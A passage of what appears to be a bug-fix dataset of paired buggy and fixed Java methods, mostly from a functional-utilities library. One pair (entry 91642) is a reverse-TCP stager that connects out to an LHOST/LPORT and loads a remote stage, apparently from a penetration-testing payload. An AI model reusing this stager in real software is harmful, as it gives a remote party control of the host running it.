 else   if (ca == float[].class) {
    return Arrays.equals((float[])a,(float[])b);
  }
 else   if (ca == double[].class) {
    return Arrays.equals((double[])a,(double[])b);
  }
 else   if (ca == short[].class) {
    return Arrays.equals((short[])a,(short[])b);
  }
 else {
    return Arrays.equals((Object[])a,(Object[])b);
  }
}"
91595,"/** 
 * Applies this partial function to the given argument when it is contained in the function domain. Applies fallback function where this partial function is not defined.
 * @param p1 the first argument
 * @param p2 the second argument
 * @param p3 the third argument
 * @param p4 the fourth argument
 * @param p5 the fifth argument
 * @param fallback the function to be called if application of this function failed with any runtime exception
 * @return a composite function apply to this function and then the callback function if this function failed
 */
public R applyOrElse(P1 p1,P2 p2,P3 p3,P4 p4,P5 p5,F5<? super P1,? super P2,? super P3,? super P4,? super P5,? extends R> fallback){
  try {
    return apply(p1,p2,p3,p4,p5);
  }
 catch (  RuntimeException e) {
    return fallback.apply(p1,p2,p3,p4,p5);
  }
}","/** 
 * Applies this partial function to the given argument when it is contained in the function domain. Applies fallback function where this partial function is not defined.
 * @param p1       the first argument
 * @param p2       the second argument
 * @param p3       the third argument
 * @param p4       the fourth argument
 * @param p5       the fifth argument
 * @param fallback the function to be called if application of this function failed with any runtime exception
 * @return a composite function apply to this function and then the callback function if this function failed
 */
public R applyOrElse(P1 p1,P2 p2,P3 p3,P4 p4,P5 p5,F5<? super P1,? super P2,? super P3,? super P4,? super P5,? extends R> fallback){
  try {
    return apply(p1,p2,p3,p4,p5);
  }
 catch (  RuntimeException e) {
    return fallback.apply(p1,p2,p3,p4,p5);
  }
}"
91596,"/** 
 * Negation of   {@link #or(Osgl.Function[])}
 * @param predicates an array of predicate functions
 * @param < T > the generic type of the argument the predicate functions take
 * @return a function that apply the argument to all predicate functions and return{@code true} if all of them return {@code false} on the argument, or{@code false} if any one of them returns {@code true}
 * @since 0.2
 */
public static <T>Predicate<T> none(final Function<? super T,Boolean>... predicates){
  return negate(or(predicates));
}","/** 
 * Negation of   {@link #or(Osgl.Function[])}
 * @param predicates an array of predicate functions
 * @param < T >        the generic type of the argument the predicate functions take
 * @return a function that apply the argument to all predicate functions and return{@code true} if all of them return {@code false} on the argument, or{@code false} if any one of them returns {@code true}
 * @since 0.2
 */
public static <T>Predicate<T> none(final Function<? super T,Boolean>... predicates){
  return negate(or(predicates));
}"
91597,"/** 
 * Type safe version of   {@link #AS_STRING}. It returns a function that takes argument of type   {@code T} and returns a String by calling{@link Object#toString()} function on the argument
 * @param tClass the class specify the generic type
 * @param < T > the generic type T of the returning function
 * @return a function of type {@link F1 F1&lt;T, String&gt;}
 */
public static <T>F1<T,String> asString(Class<T> tClass){
  return AS_STRING;
}","/** 
 * Type safe version of   {@link #AS_STRING}. It returns a function that takes argument of type   {@code T} and returns a String by calling{@link Object#toString()} function on the argument
 * @param tClass the class specify the generic type
 * @param < T >    the generic type T of the returning function
 * @return a function of type {@link F1 F1&lt;T, String&gt;}
 */
public static <T>F1<T,String> asString(Class<T> tClass){
  return AS_STRING;
}"
91598,"/** 
 * Negate of   {@link #isDefined()}
 * @since 0.2
 */
public boolean notDefined(){
  return !isDefined();
}","/** 
 * Negate of   {@link #isDefined()}
 * @return {@code true} if this option is not defined
 * @since 0.2
 */
public boolean notDefined(){
  return !isDefined();
}"
91599,"/** 
 * Set an object field value using reflection.
 * @param fieldName the name of the field to be set
 * @param obj the object on which the value will be set
 * @param val the value to be set to the field
 * @param < T > the type of the object
 * @param < F > the type of the field value
 * @return the object that has the new value set on the field specified
 */
public static <T,F>T setField(String fieldName,T obj,F val){
  Class<?> cls=obj.getClass();
  try {
    Field f;
    try {
      f=cls.getDeclaredField(fieldName);
    }
 catch (    NoSuchFieldException e) {
      f=cls.getField(fieldName);
    }
    f.setAccessible(true);
    f.set(obj,val);
  }
 catch (  Exception e) {
    E.unexpected(e);
  }
  return obj;
}","/** 
 * Set an object field value using reflection.
 * @param fieldName the name of the field to be set
 * @param obj       the object on which the value will be set
 * @param val       the value to be set to the field
 * @param < T >       the type of the object
 * @param < F >       the type of the field value
 * @return the object that has the new value set on the field specified
 */
public static <T,F>T setField(String fieldName,T obj,F val){
  Class<?> cls=obj.getClass();
  try {
    Field f;
    try {
      f=cls.getDeclaredField(fieldName);
    }
 catch (    NoSuchFieldException e) {
      f=cls.getField(fieldName);
    }
    f.setAccessible(true);
    f.set(obj,val);
  }
 catch (  Exception e) {
    E.unexpected(e);
  }
  return obj;
}"
91600,"/** 
 * The type-safe version of   {@link #IDENTITY}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>F1<T,T> identity(){
  return IDENTITY;
}","/** 
 * The type-safe version of   {@link #IDENTITY}
 * @param < T > the element type
 * @return the identity function that always return the argument itself
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>F1<T,T> identity(){
  return IDENTITY;
}"
91601,"public static <A,B>Tuple<A,B> Tuple(A a,B b){
  return new Tuple(a,b);
}","@SuppressWarnings(""String_Node_Str"") public static <P1,P2>Tuple<P1,P2> Tuple(P1 a,P2 b){
  return new Tuple<P1,P2>(a,b);
}"
91602,"/** 
 * Returns a function that when applied, run   {@link Osgl.Option#runWith(Osgl.Function)}on this   {@code Option}
 */
public final F0<Void> runWith(final Function<? super T,?> consumer){
  return new F0<Void>(){
    @Override public Void apply() throws NotAppliedException, Break {
      Option.this.runWith(consumer);
      return null;
    }
  }
;
}","/** 
 * Returns a function that when applied, run   {@link Osgl.Option#runWith(Osgl.Function)}on this   {@code Option}
 * @param consumer the function that consumes the element in this Option
 * @return a function that apply to {@code consumer} function if this Option is defined
 */
@SuppressWarnings(""String_Node_Str"") public final F0<Void> runWith(final Function<? super T,?> consumer){
  return new F0<Void>(){
    @Override public Void apply() throws NotAppliedException, Break {
      Option.this.runWith(consumer);
      return null;
    }
  }
;
}"
91603,"/** 
 * Alias of   {@link #gt(java.util.Comparator)}
 * @since 0.2
 */
public static <T>F2<T,T,Boolean> greaterThan(final Func2<? super T,? super T,Integer> c){
  return gt(c);
}","/** 
 * Alias of   {@link #gt(java.util.Comparator)}
 * @param c   a comparator function
 * @param < T > the element type
 * @return a function that use comparator function {@code c} to check if an object is greater than another
 * @since 0.2
 */
public static <T>F2<T,T,Boolean> greaterThan(final Func2<? super T,? super T,Integer> c){
  return gt(c);
}"
91604,"/** 
 * Construct a   {@link Comparator} with a function to extract the key of type U from given object of type T anda comparator to compare type U
 * @param keyExtractor the function to extract the key for comparison
 * @param keyComparator the {@link Comparator} that compares type U (the key type)
 * @param < T > the type of the object instance
 * @param < U > the type of the key extract from T
 * @return a comparator that compares type T objects
 */
public static <T,U>Comparator<T> comparing(final Function<? super T,? extends U> keyExtractor,final java.util.Comparator<? super U> keyComparator){
  E.NPE(keyExtractor,keyComparator);
  return new Comparator<T>(){
    @Override public int compare(    T o1,    T o2){
      return keyComparator.compare(keyExtractor.apply(o1),keyExtractor.apply(o2));
    }
  }
;
}","/** 
 * Construct a   {@link Comparator} with a function to extract the key of type U from given object of type T anda comparator to compare type U
 * @param keyExtractor  the function to extract the key for comparison
 * @param keyComparator the {@link Comparator} that compares type U (the key type)
 * @param < T >           the type of the object instance
 * @param < U >           the type of the key extract from T
 * @return a comparator that compares type T objects
 */
public static <T,U>Comparator<T> comparing(final Function<? super T,? extends U> keyExtractor,final java.util.Comparator<? super U> keyComparator){
  E.NPE(keyExtractor,keyComparator);
  return new Comparator<T>(){
    @Override public int compare(    T o1,    T o2){
      return keyComparator.compare(keyExtractor.apply(o1),keyExtractor.apply(o2));
    }
  }
;
}"
91605,"public static <K,T>IndexedVisitor<K,T> indexGuardedVisitor(final Function<? super K,Boolean> guard,final Visitor<? super T> visitor){
  return new IndexedVisitor<K,T>(){
    @Override public void visit(    K id,    T t) throws Break {
      if (guard.apply(id)) {
        visitor.apply(t);
      }
    }
  }
;
}","@SuppressWarnings(""String_Node_Str"") public static <K,T>IndexedVisitor<K,T> indexGuardedVisitor(final Function<? super K,Boolean> guard,final Visitor<? super T> visitor){
  return new IndexedVisitor<K,T>(){
    @Override public void visit(    K id,    T t) throws Break {
      if (guard.apply(id)) {
        visitor.apply(t);
      }
    }
  }
;
}"
91606,"/** 
 * The type-safe version of   {@link #NE}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2>F2<P1,P2,Boolean> ne(){
  return NE;
}","/** 
 * The type-safe version of   {@link #NE}
 * @param < P1 > type of the first argument
 * @param < P2 > type of the second argument
 * @return the type-safe version of {@link #NE}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2>F2<P1,P2,Boolean> ne(){
  return NE;
}"
91607,"@SuppressWarnings({""String_Node_Str"",""String_Node_Str""}) public static <T>Predicate<T> generalPredicate(final Function<? super T,?> f1){
  if (f1 instanceof Predicate) {
    return (Predicate<T>)f1;
  }
  return new Predicate<T>(){
    @Override public boolean test(    T t){
      return bool(f1.apply(t));
    }
  }
;
}","@SuppressWarnings({""String_Node_Str"",""String_Node_Str""}) public static <T>Predicate<T> generalPredicate(final Function<? super T,?> f){
  if (f instanceof Predicate) {
    return (Predicate<T>)f;
  }
  return new Predicate<T>(){
    @Override public boolean test(    T t){
      return bool(f.apply(t));
    }
  }
;
}"
91608,"/** 
 * Convert a   {@code Function&lt;? super T, Void&gt;} function into a {@link Visitor}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Visitor<T> visitor(final Function<? super T,?> f){
  if (f instanceof Visitor) {
    return (Visitor<T>)f;
  }
  return new Visitor<T>(){
    @Override public void visit(    T t) throws Break {
      f.apply(t);
    }
  }
;
}","/** 
 * Convert a   {@code Function&lt;? super T, Void&gt;} function into a {@link Visitor}
 * @param f   the function to be cast
 * @param < T > the argument type
 * @return a {@link Visitor} type function that is equal with the function {@code f}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Visitor<T> visitor(final Function<? super T,?> f){
  if (f instanceof Visitor) {
    return (Visitor<T>)f;
  }
  return new Visitor<T>(){
    @Override public void visit(    T t) throws Break {
      f.apply(t);
    }
  }
;
}"
91609,"/** 
 * A type-safe version of   {@link #FALSE}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Predicate<T> no(){
  return FALSE;
}","/** 
 * A type-safe version of   {@link #FALSE}
 * @param < T > the argument type
 * @return a function that always return {@code false}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Predicate<T> no(){
  return FALSE;
}"
91610,"/** 
 * The place sub class to implement the transform logic
 */
public abstract TO transform(FROM from);","/** 
 * The place sub class to implement the transform logic
 * @param from the element to be transformed
 * @return the transformed object
 */
public abstract TO transform(FROM from);"
91611,"/** 
 * Returns a composed   {@link Osgl.Predicate} function that for any given parameter, the test result is <code>true</code>only when any one of the specified predicates returns <code>true</code> when applied to the parameter
 * @param predicates an array of predicates that can be applied to a parameter and returns boolean value
 * @param < T >        the type of the parameter the predicates applied to
 * @return a composed function
 * @since 0.2
 */
public static <T>Predicate<T> or(final Function<? super T,Boolean>... predicates){
  return null;
}","/** 
 * Returns a composed   {@link Osgl.Predicate} function that for any given parameter, the test result is <code>true</code>when any one of the specified predicates returns <code>true</code> on the parameter
 * @param predicates an array of predicates that can be applied to a parameter and returns boolean value
 * @param < T >        the type of the parameter the predicates applied to
 * @return a composed function
 * @since 0.2
 */
public static <T>Predicate<T> or(final Function<? super T,Boolean>... predicates){
  return or(C.listOf(predicates));
}"
91612,"/** 
 * Alias of   {@link #or(Osgl.Function[])}
 * @since 0.2
 */
public static <T>Predicate<T> any(final Function<? super T,Boolean>... predicates){
  return or(predicates);
}","/** 
 * Alias of   {@link #or(Osgl.Function[])}
 * @param predicates an array of predicate functions
 * @param < T >        the argument type
 * @return the function that returns {@code true} if any one of the predicate functionreturns  {@code true}
 * @since 0.2
 */
public static <T>Predicate<T> any(final Function<? super T,Boolean>... predicates){
  return or(predicates);
}"
91613,"/** 
 * Execute callback asynchronously after delay specified
 * @param callback the callback function to be executed
 * @param milliseconds the delay
 * @param < T > return type
 * @return the result of the callback
 */
public static <T>Future<T> async(final Osgl.F0<T> callback,final int milliseconds){
  return _exec.submit(new Callable<T>(){
    @Override public T call() throws Exception {
      Thread.sleep(milliseconds);
      return callback.apply();
    }
  }
);
}","/** 
 * Execute callback asynchronously after delay specified
 * @param callback     the callback function to be executed
 * @param milliseconds the delay
 * @param < T >          return type
 * @return the result of the callback
 */
public static <T>Future<T> async(final Osgl.F0<T> callback,final int milliseconds){
  return _exec.submit(new Callable<T>(){
    @Override public T call() throws Exception {
      Thread.sleep(milliseconds);
      return callback.apply();
    }
  }
);
}"
91614,"/** 
 * Returns a predicate function that check if the argument is contained in the collection specified
 * @param c the collection to be checked on against the argument when applying the prediate
 * @param < T > the generic type of the element of the collection
 * @return a predicate function
 */
public static <T>$.Predicate<T> containsIn(final Collection<? super T> c){
  return new $.Predicate<T>(){
    @Override public boolean test(    T t) throws NotAppliedException, $.Break {
      return c.contains(t);
    }
  }
;
}","/** 
 * Returns a predicate function that check if the argument is contained in the collection specified
 * @param collection the collection to be checked on against the argument when applying the prediate
 * @param < T > the generic type of the element of the collection
 * @return a predicate function
 * @see {@link Collection#contains(Object)}
 */
public static <T>$.Predicate<T> containsIn(final Collection<? super T> collection){
  return new $.Predicate<T>(){
    @Override public boolean test(    T t) throws NotAppliedException, $.Break {
      return collection.contains(t);
    }
  }
;
}"
91615,"public static <T>$.Predicate<Collection<? super T>> removeAllFrom(final Iterable<? extends T> c){
  return new $.Predicate<Collection<? super T>>(){
    @Override public boolean test(    Collection<? super T> c1) throws NotAppliedException, $.Break {
      if (c instanceof Collection) {
        return c1.removeAll((Collection<?>)c);
      }
      HashSet<T> s=new HashSet<T>();
      for (      T t : c) {
        s.add(t);
      }
      return c1.removeAll(s);
    }
  }
;
}","@SuppressWarnings({""String_Node_Str"",""String_Node_Str""}) public static <T>$.Predicate<Iterable<T>> removeAllFrom(final Collection<? super T> collection){
  return new $.Predicate<Iterable<T>>(){
    @Override public boolean test(    Iterable<T> iterable){
      if (iterable instanceof Collection) {
        return collection.removeAll((Collection)iterable);
      }
      boolean modified=false;
      for (      T t : iterable) {
        boolean b=collection.remove(t);
        modified=modified || b;
      }
      return modified;
    }
  }
;
}"
91616,"public static $.F1<?,Boolean> removeFrom(final Collection<?> c){
  return new $.F1<Object,Boolean>(){
    @Override public Boolean apply(    Object t) throws NotAppliedException, $.Break {
      return c.remove(t);
    }
  }
;
}","/** 
 * Returns a function that remove the argument from a collection specified. <p>The function returns   {@code true} if argument removed successfully or{@code false} otherwise</p>
 * @param collection the collection from which the argument to be removedwhen applying the function returned
 * @return the function that remove element from the collection
 * @see Collection#remove(Object)
 */
@SuppressWarnings(""String_Node_Str"") public static $.Predicate<?> removeFrom(final Collection<?> collection){
  return new $.Predicate<Object>(){
    @Override public boolean test(    Object t) throws NotAppliedException, $.Break {
      return collection.remove(t);
    }
  }
;
}"
91617,"public static <T>$.F1<T,Sequence<? super T>> prependTo(final Sequence<? super T> c){
  return new $.F1<T,Sequence<? super T>>(){
    @Override public Sequence<? super T> apply(    T t) throws NotAppliedException, $.Break {
      c.prepend(t);
      return c;
    }
  }
;
}","/** 
 * Returns a function that prepend the argument to a   {@link Sequence} specified
 * @param sequence the sequence to which the argument shall be prepend whene applying the function
 * @param < T > the generic type of the argument/sequence element
 * @return the function that do the prepend operation
 */
@SuppressWarnings(""String_Node_Str"") public static <T>$.F1<T,Sequence<? super T>> prependTo(final Sequence<? super T> sequence){
  return new $.F1<T,Sequence<? super T>>(){
    @Override public Sequence<? super T> apply(    T t) throws NotAppliedException, $.Break {
      sequence.prepend(t);
      return sequence;
    }
  }
;
}"
91618,"public static <T>$.Predicate<Iterable<? extends T>> addAllTo(final List<? super T> l,final int index){
  if (0 > index || l.size() < index) {
    throw new IndexOutOfBoundsException();
  }
  return new $.Predicate<Iterable<? extends T>>(){
    @Override public boolean test(    Iterable<? extends T> itr) throws NotAppliedException, $.Break {
      if (itr instanceof Collection) {
        return l.addAll(index,((Collection<? extends T>)itr));
      }
      boolean modified=false;
      for (      T t : itr) {
        l.add(index,t);
        modified=true;
      }
      return modified;
    }
  }
;
}","@SuppressWarnings({""String_Node_Str"",""String_Node_Str""}) public static <T>$.Predicate<Iterable<? extends T>> addAllTo(final List<? super T> list,final int index){
  if (0 > index || list.size() < index) {
    throw new IndexOutOfBoundsException();
  }
  return new $.Predicate<Iterable<? extends T>>(){
    @Override public boolean test(    Iterable<? extends T> itr) throws NotAppliedException, $.Break {
      if (itr instanceof Collection) {
        return list.addAll(index,((Collection<? extends T>)itr));
      }
      boolean modified=false;
      for (      T t : itr) {
        list.add(index,t);
        modified=true;
      }
      return modified;
    }
  }
;
}"
91619,"/** 
 * Returns a function that add the argument into the specified list at specified position. the function returns   {@code true} if added successfully or {@code false} otherwise
 * @param c a list into which the argument to be added
 * @param index specify the position where the argument can be added
 * @param < C > the generic type of the list
 * @param < T > the generic type of the list element
 * @return the function that do the add operation
 */
@SuppressWarnings(""String_Node_Str"") public static <C extends List<? super T>,T>$.F1<T,C> addTo(final C c,final int index){
  return new $.F1<T,C>(){
    @Override public C apply(    T t) throws NotAppliedException, $.Break {
      c.add(index,t);
      return c;
    }
  }
;
}","/** 
 * Returns a function that add the argument into the specified list at specified position. the function returns   {@code true} if added successfully or {@code false} otherwise
 * @param list a list into which the argument to be added
 * @param index specify the position where the argument can be added
 * @param < L > the generic type of the list
 * @param < T > the generic type of the list element
 * @return the function that do the add operation
 * @see {@link java.util.List#add(int,Object)}
 */
@SuppressWarnings(""String_Node_Str"") public static <L extends List<? super T>,T>$.F1<T,L> addTo(final L list,final int index){
  return new $.F1<T,L>(){
    @Override public L apply(    T t) throws NotAppliedException, $.Break {
      list.add(index,t);
      return list;
    }
  }
;
}"
91620,"@Override public boolean test(Collection<? super T> c1) throws NotAppliedException, $.Break {
  if (c instanceof Collection) {
    return c1.retainAll((Collection)c);
  }
  HashSet<T> s=new HashSet<T>();
  for (  T t : c) {
    s.add(t);
  }
  return c1.retainAll(s);
}","@Override public boolean test(Iterable<T> iterable){
  if (iterable instanceof Collection) {
    return collection.retainAll((Collection)iterable);
  }
  List<T> list=C.list(iterable);
  return collection.retainAll(list);
}"
91621,"public static <T>$.Predicate<? extends Collection<? super T>> retainAllIn(final Iterable<? extends T> c){
  return new $.Predicate<Collection<? super T>>(){
    @Override public boolean test(    Collection<? super T> c1) throws NotAppliedException, $.Break {
      if (c instanceof Collection) {
        return c1.retainAll((Collection)c);
      }
      HashSet<T> s=new HashSet<T>();
      for (      T t : c) {
        s.add(t);
      }
      return c1.retainAll(s);
    }
  }
;
}","@SuppressWarnings({""String_Node_Str"",""String_Node_Str""}) public static <T>$.Predicate<Iterable<T>> retainAllIn(final Collection<? super T> collection){
  return new $.Predicate<Iterable<T>>(){
    @Override public boolean test(    Iterable<T> iterable){
      if (iterable instanceof Collection) {
        return collection.retainAll((Collection)iterable);
      }
      List<T> list=C.list(iterable);
      return collection.retainAll(list);
    }
  }
;
}"
91622,"public static <T>$.F1<T,Sequence<? super T>> appendTo(final Sequence<? super T> c){
  return new $.F1<T,Sequence<? super T>>(){
    @Override public Sequence<? super T> apply(    T t) throws NotAppliedException, $.Break {
      c.append(t);
      return c;
    }
  }
;
}","/** 
 * Returns a function that append the argument to a   {@link Sequence} specified<p><b>Note</b> the function returns the sequence with the argument been removed</p>
 * @param sequence the sequence to which the argument shall be append when applying the function
 * @param < T > the generic type of the argument/sequence element
 * @return the function that do the append operation
 */
@SuppressWarnings(""String_Node_Str"") public static <T>$.F1<T,Sequence<? super T>> appendTo(final Sequence<? super T> sequence){
  return new $.F1<T,Sequence<? super T>>(){
    @Override public Sequence<? super T> apply(    T t) throws NotAppliedException, $.Break {
      sequence.append(t);
      return sequence;
    }
  }
;
}"
91623,"@Test(expected=NotAppliedException.class) public void byDefaultInverseShallThrowOutNotAppliedException(){
  toLowerCase.inverse();
}","@Test(expected=NotAppliedException.class) public void byDefaultInverseShallThrowOutNotAppliedException(){
  toLowerCase.invert();
}"
91624,"public static UnsupportedException tbd(String info){
  return tbd();
}","public static UnsupportedException tbd(String feature){
  throw new UnsupportedException(""String_Node_Str"",feature);
}"
91625,"private EmptyList(){
  super((T[])new Object[]{});
}","private EmptyList(){
  super((T[])new Object[0]);
}"
91626,"@Test public void testRevertBeginPointer(){
  final String s=""String_Node_Str"";
  char[] buf=Unsafe.bufOf(s);
  FastStr fs=FastStr.unsafeOf(s);
  assertSame(buf,Unsafe.bufOf(fs));
  fs=fs.afterFirst(""String_Node_Str"").afterFirst('/');
  ceq(fs,""String_Node_Str"");
  assertSame(buf,Unsafe.bufOf(fs));
  FastStr fs0=fs.prepend('/');
  ceq(fs0,""String_Node_Str"");
  assertSame(buf,Unsafe.bufOf(fs0));
  fs0=fs.prepend(""String_Node_Str"");
  assertSame(buf,Unsafe.bufOf(fs0));
  ceq(fs0,""String_Node_Str"");
}","@Test public void testRevertBeginPointer(){
  final String s=""String_Node_Str"";
  char[] buf=Unsafe.bufOf(s);
  FastStr fs=FastStr.unsafeOf(s);
  fs=fs.afterFirst(""String_Node_Str"").afterFirst('/');
  ceq(fs,""String_Node_Str"");
  FastStr fs0=fs.prepend('/');
  ceq(fs0,""String_Node_Str"");
  fs0=fs.prepend(""String_Node_Str"");
  ceq(fs0,""String_Node_Str"");
}"
91627,"public static void main(String[] args){
  None<String> none=none();
  System.out.println(none);
  F1<String,Integer> hc=_.F.hc();
  System.out.println(hc.apply(""String_Node_Str""));
  F1<Integer,String> toString=_.F.asString();
  System.out.println(toString.apply(33));
  F0<String> f0=_.F0;
  System.out.println(f0.apply());
}","public static void main(String[] args){
  None<String> none=none();
  System.out.println(none);
  F1<String,Integer> hc=_.F.hc();
  System.out.println(hc.apply(""String_Node_Str""));
  F1<Integer,String> toString=_.F.asString();
  System.out.println(toString.apply(33));
  F0<String> f0=_.F0;
  System.out.println(f0.apply());
  ListBuilder<String> lb=ListBuilder.create();
  List<String> l=lb.toList();
  System.out.println(l.size());
}"
91628,"@Override public T get(int index){
  return data.get(size() - index);
}","@Override public T get(int index){
  return data.get(size() - index - 1);
}"
91629,"@Override public Character next(){
  if (cursor >= len) {
    throw new NoSuchElementException();
  }
  return s.charAt(++cursor);
}","@Override public Character next(){
  if (cursor >= len) {
    throw new NoSuchElementException();
  }
  return s.charAt(cursor++);
}"
91630,"@Override public C.List<T> dropWhile(_.Function<? super T,Boolean> predicate){
  boolean immutable=isImmutable();
  int sz=size();
  if (immutable) {
    if (0 == sz) {
      return Nil.list();
    }
    ListBuilder<T> lb=new ListBuilder<T>(sz);
    for (    T t : this) {
      if (predicate.apply(t)) {
        lb.add(t);
      }
 else {
        break;
      }
    }
    return lb.toList();
  }
 else {
    if (0 == sz) {
      return C.newList();
    }
    C.List<T> l=C.newSizedList(sz);
    for (    T t : this) {
      if (predicate.apply(t)) {
        l.add(t);
      }
 else {
        break;
      }
    }
    return l;
  }
}","@Override public C.List<T> dropWhile(_.Function<? super T,Boolean> predicate){
  boolean immutable=isImmutable();
  int sz=size();
  if (immutable) {
    if (0 == sz) {
      return Nil.list();
    }
    ListBuilder<T> lb=new ListBuilder<T>(sz);
    boolean found=false;
    for (    T t : this) {
      if (!found && predicate.apply(t)) {
        continue;
      }
 else {
        found=true;
        lb.add(t);
      }
    }
    return lb.toList();
  }
 else {
    if (0 == sz) {
      return C.newList();
    }
    C.List<T> l=C.newSizedList(sz);
    boolean found=false;
    for (    T t : this) {
      if (!found && predicate.apply(t)) {
        continue;
      }
 else {
        found=true;
        l.add(t);
      }
    }
    return l;
  }
}"
91631,"@Test public void testCurry2(){
  eq(rand1 / rand2,divide.curry(rand1,rand2).apply().doubleValue());
}","@Test public void testCurry2(){
  eq(RAND_1 / RAND_2,divide.curry(RAND_1,RAND_2).apply().doubleValue());
}"
91632,"@Test public void testChainedStyleAndThen(){
  eq(-1 * (rand1 / rand2),divide.andThen(negative).apply(rand1,rand2).doubleValue());
}","@Test public void testChainedStyleAndThen(){
  eq(-1 * (RAND_1 / RAND_2),divide.andThen(NEGATIVE).apply(RAND_1,RAND_2).doubleValue());
}"
91633,"@Test public void liftedFunctionShallNotBeDefinedInCaseNotApplied(){
  yes(divide.lift().apply(rand1,0).notDefined());
}","@Test public void liftedFunctionShallNotBeDefinedInCaseNotApplied(){
  yes(divide.lift().apply(RAND_1,0).notDefined());
}"
91634,"@Test public void elseShallNotBeCalledNormally(){
  eq(rand1 / rand2,divide.applyOrElse(rand1,rand2,inCaseFailed).doubleValue());
  eq(rand1 / rand2,divide.orElse(inCaseFailed).apply(rand1,rand2).doubleValue());
}","@Test public void elseShallNotBeCalledNormally(){
  eq(RAND_1 / RAND_2,divide.applyOrElse(RAND_1,RAND_2,inCaseFailed).doubleValue());
  eq(RAND_1 / RAND_2,divide.orElse(inCaseFailed).apply(RAND_1,RAND_2).doubleValue());
}"
91635,"@Test public void liftedFunctionShallBeDefinedInNormalCase(){
  yes(divide.lift().apply(rand1,rand2).isDefined());
}","@Test public void liftedFunctionShallBeDefinedInNormalCase(){
  yes(divide.lift().apply(RAND_1,RAND_2).isDefined());
}"
91636,"@Test public void testCurry(){
  eq(rand1 / rand2,divide.curry(rand2).apply(rand1).doubleValue());
}","@Test public void testCurry(){
  eq(RAND_1 / RAND_2,divide.curry(RAND_2).apply(RAND_1).doubleValue());
}"
91637,"@Test public void elseShallBeCalledInCaseNotApplied(){
  eq(ERROR_VAL,divide.applyOrElse(rand1,0,inCaseFailed).doubleValue());
  eq(ERROR_VAL,divide.orElse(inCaseFailed).apply(rand1,0).doubleValue());
}","@Test public void elseShallBeCalledInCaseNotApplied(){
  eq(ERROR_VAL,divide.applyOrElse(RAND_1,0,inCaseFailed).doubleValue());
  eq(ERROR_VAL,divide.orElse(inCaseFailed).apply(RAND_1,0).doubleValue());
}"
91638,"@Test public void lastFunctionWinForListStyleAndThen(){
  eq(rand1 * rand2,divide.andThen(multiply).apply(rand1,rand2).doubleValue());
}","@Test public void lastFunctionWinForListStyleAndThen(){
  eq(RAND_1 * RAND_2,divide.andThen(multiply).apply(RAND_1,RAND_2).doubleValue());
}"
91639,"@Override public V remove(Object key){
  return remove(key);
}","@Override public V remove(Object key){
  return _m.remove(key);
}"
91640,"@Override public C.List<Character> prepend(Character character){
  StringBuilder sb=new StringBuilder(character).append(s);
  return of(sb);
}","public Str prepend(String s){
  if (""String_Node_Str"".equals(s)) {
    return this;
  }
  if (EMPTY_STR.equals(this)) {
    return of(s);
  }
  return of(s.concat(this.s));
}"
91641,"public Str append(String s){
  if (""String_Node_Str"".equals(s)) {
    return this;
  }
  if (EMPTY_STR.equals(this)) {
    return of(s);
  }
  return of(s.concat(s));
}","public Str append(String s){
  if (""String_Node_Str"".equals(s)) {
    return this;
  }
  if (EMPTY_STR.equals(this)) {
    return of(s);
  }
  return of(this.s.concat(s));
}"
91642,"private void reverseTCP(){
  try {
    String lhost=LHOST.substring(4);
    String lport=LPORT.substring(4).trim();
    Socket msgsock=new Socket(lhost,Integer.parseInt(lport));
    DataInputStream in=new DataInputStream(msgsock.getInputStream());
    OutputStream out=new DataOutputStream(msgsock.getOutputStream());
    new LoadStage().start(in,out,this,new String[]{});
    msgsock.close();
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
}","private void reverseTCP(){
  try {
    String lhost=LHOST.substring(4).trim();
    String lport=LPORT.substring(4).trim();
    Socket msgsock=new Socket(lhost,Integer.parseInt(lport));
    DataInputStream in=new DataInputStream(msgsock.getInputStream());
    OutputStream out=new DataOutputStream(msgsock.getOutputStream());
    new LoadStage().start(in,out,this,new String[]{});
    msgsock.close();
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
}"
91643,"/** 
 * Ensures that the given dimension is equals to the expected value. If not, throws an exception.
 * @param argument  the name of the argument being tested.
 * @param dimension the dimension of the argument value.
 * @param expected  the expected dimension.
 */
private static void ensureDimensionMatches(final String argument,final int dimension,final int expected) throws MismatchedDimensionException {
  if (dimension != expected) {
    throw new MismatchedDimensionException(Errors.format(Errors.Keys.MismatchedDimension_3,argument,dimension,expected));
  }
}","/** 
 * Ensures that the given dimension is equals to the expected value. If not, throws an exception.
 * @param argument  the name of the argument being tested.
 * @param expected  the expected number of dimension.
 * @param dimension the actual dimension of the argument value.
 */
private static void ensureDimensionMatches(final String argument,final int expected,final int dimension) throws MismatchedDimensionException {
  if (dimension != expected) {
    throw new MismatchedDimensionException(Errors.format(Errors.Keys.MismatchedDimension_3,argument,expected,dimension));
  }
}"
91644,"/** 
 * Creates the grid geometry and collect related metadata. This method shall be invoked exactly once after   {@link #validateMandatoryTags()}. After this method call (if successful),   {@link #gridGeometry} is guaranteed non-nulland can be used as a flag for determining that the build has been completed.
 * @param extent  the image width and height in pixels. Must be two-dimensional.
 * @return {@link #gridGeometry}, guaranteed non-null.
 * @throws FactoryException if an error occurred while creating a CRS or a transform.
 */
public GridGeometry build(final GridExtent extent) throws FactoryException {
  CoordinateReferenceSystem crs=null;
  if (keyDirectory != null) {
    final CRSBuilder helper=new CRSBuilder(reader);
    try {
      crs=helper.build(keyDirectory,numericParameters,asciiParameters);
      description=helper.description;
      cellGeometry=helper.cellGeometry;
    }
 catch (    NoSuchIdentifierException|ParameterNotFoundException e) {
      short key=Resources.Keys.UnsupportedProjectionMethod_1;
      if (e instanceof NoSuchAuthorityCodeException) {
        key=Resources.Keys.UnknownCRS_1;
      }
      reader.owner.warning(reader.resources().getString(key,reader.owner.getDisplayName()),e);
    }
catch (    IllegalArgumentException|NoSuchElementException|ClassCastException e) {
      if (!helper.alreadyReported) {
        reader.owner.warning(null,e);
      }
    }
  }
